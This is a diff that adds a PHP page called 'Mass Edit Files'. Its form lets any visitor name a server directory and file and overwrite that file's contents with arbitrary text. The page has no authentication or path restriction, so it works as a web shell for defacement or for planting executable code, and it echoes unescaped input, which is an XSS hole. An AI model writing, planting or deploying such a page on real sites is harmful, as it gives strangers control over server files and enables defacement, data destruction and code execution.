@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mass Edit Files</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+            background-color: #f4f4f4;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #fff;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+        }
+        h1 {
+            text-align: center;
+        }
+        form {
+            display: flex;
+            flex-direction: column;
+        }
+        input, textarea, button {
+            margin-bottom: 10px;
+            padding: 10px;
+            font-size: 16px;
+        }
+        button {
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+        .output {
+            margin-top: 20px;
+            padding: 10px;
+            background-color: #e7f3e7;
+            border: 1px solid #d4e3d4;
+            border-radius: 4px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Mass Edit Files</h1>
+        <form method="post">
+            <input type="text" name="directory" placeholder="Path Directory" required>
+            <input type="text" name="filename" placeholder="Name of File to Edit" required>
+            <textarea name="newtext" placeholder="New Text to Replace File Content" required></textarea>
+            <button type="submit">Submit</button>
+        </form>
+
+        <?php
+        if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+            $directory = rtrim($_POST['directory'], '/');
+            $filename = $_POST['filename'];
+            $newtext = $_POST['newtext'];
+            $filepath = $directory . '/' . $filename;
+
+            if (file_exists($filepath)) {
+                file_put_contents($filepath, $newtext);
+                echo "<div class='output'>Updated file: $filepath</div>";
+            } else {
+                echo "<div class='output'>File does not exist: $filepath</div>";
+            }
+        }
+        ?>
+    </div>
+</body>
+</html>
